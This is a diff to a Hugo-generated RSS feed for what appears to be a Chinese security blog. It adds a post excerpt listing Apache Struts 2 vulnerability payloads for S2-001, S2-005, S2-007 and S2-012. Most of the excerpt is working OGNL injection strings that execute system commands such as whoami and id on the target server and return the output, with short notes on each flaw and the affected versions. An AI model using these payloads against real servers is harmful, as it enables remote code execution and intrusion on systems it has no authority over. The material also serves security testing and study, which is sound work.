@@ -6,10 +6,22 @@
     <description>Recent content in Posts on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 23 May 2018 11:14:51 +0800</lastBuildDate>
+    <lastBuildDate>Mon, 25 Jun 2018 21:26:14 +0800</lastBuildDate>
     
 	<atom:link href="http://wyb0.com/posts/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Struts 2相关漏洞payload</title>
+      <link>http://wyb0.com/posts/structs2-some-vulnerability-payload/</link>
+      <pubDate>Mon, 25 Jun 2018 21:26:14 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/structs2-some-vulnerability-payload/</guid>
+      <description>0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。  %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&amp;quot;whoami&amp;quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&amp;quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}  0x01 S2-005 影响版本: 2.0.0 - 2.1.8.1
+http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;amp;(asdf)((&#39;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#39;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1  0x02 S2-007 影响版本: 2.0.0 - 2.2.3
+当配置了验证规则 &amp;lt;ActionName&amp;gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。  &#39; + (#_memberAccess[&amp;quot;allowStaticMethodAccess&amp;quot;]=true,#foo=new java.lang.Boolean(&amp;quot;false&amp;quot;) ,#context[&amp;quot;xwork.MethodAccessor.denyMethodExecution&amp;quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;  0x03 S2-012 影响版本: 2.1.0 - 2.3.13
+这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。  %{#a=(new java.lang.ProcessBuilder(new java.</description>
+    </item>
     
     <item>
       <title>SQL注入的一些tips</title>
